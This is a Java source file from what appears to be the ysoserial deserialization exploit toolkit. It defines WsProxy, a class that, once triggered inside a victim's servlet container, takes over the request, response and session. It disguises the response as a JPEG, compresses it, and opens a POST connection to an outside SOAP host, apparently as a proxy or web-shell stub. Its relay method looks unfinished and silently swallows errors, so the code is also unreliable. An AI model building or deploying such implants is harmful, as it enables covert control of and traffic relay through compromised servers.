package ysoserial.payloads.util;

import java.io.InputStream;
import java.io.OutputStream;
import java.io.PrintStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.zip.Deflater;
import java.util.zip.DeflaterOutputStream;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import javax.servlet.jsp.PageContext;

public class WsProxy {
   public transient PageContext pc;
   public transient HttpServletRequest r;
   public transient HttpServletResponse rp;
   public transient OutputStream o;
   public transient HttpSession ss;

   public WsProxy() {
   }

   public void log(Exception var1) {
      if (this.o != null && var1 != null) {
         var1.printStackTrace(new PrintStream(this.o));
      }

   }

   private void c() {
      try {
         URL var1 = new URL("http://www.herongyang.com/MyService");
         HttpURLConnection var2 = (HttpURLConnection)var1.openConnection();
         var2.setRequestMethod("POST");
         var2.setRequestProperty("Content-type", "text/xml; charset=utf-8");
         var2.setRequestProperty("SOAPAction", "http://herongyang.com/MyService#MyMethod");
         OutputStream var3 = var2.getOutputStream();
         InputStream var4 = var2.getInputStream();
         byte[] var5 = new byte[10240];
         var4.read(var5);
      } catch (Exception var7) {
      }

   }

   public boolean equals(Object var1) {
      Deflater var2 = null;
      if (var1 instanceof PageContext) {
         try {
            this.pc = (PageContext)var1;
            this.r = (HttpServletRequest)this.pc.getRequest();
            this.rp = (HttpServletResponse)this.pc.getResponse();
            this.o = this.rp.getOutputStream();
            var2 = new Deflater(9);
            this.o = new DeflaterOutputStream(this.o, var2);
            this.ss = this.r.getSession(false);
            if (this.ss == null) {
               this.ss = this.r.getSession(true);
            }

            this.rp.reset();
            this.rp.setContentType("image/jpeg");
            this.c();
         } catch (Exception var16) {
            this.log(var16);
         } finally {
            if (this.o != null) {
               try {
                  this.o.flush();
               } catch (Throwable var15) {
               }

               try {
                  this.o.close();
               } catch (Throwable var14) {
               }
            }

            if (var2 != null) {
               var2.end();
            }

         }
      }

      return false;
   }
}
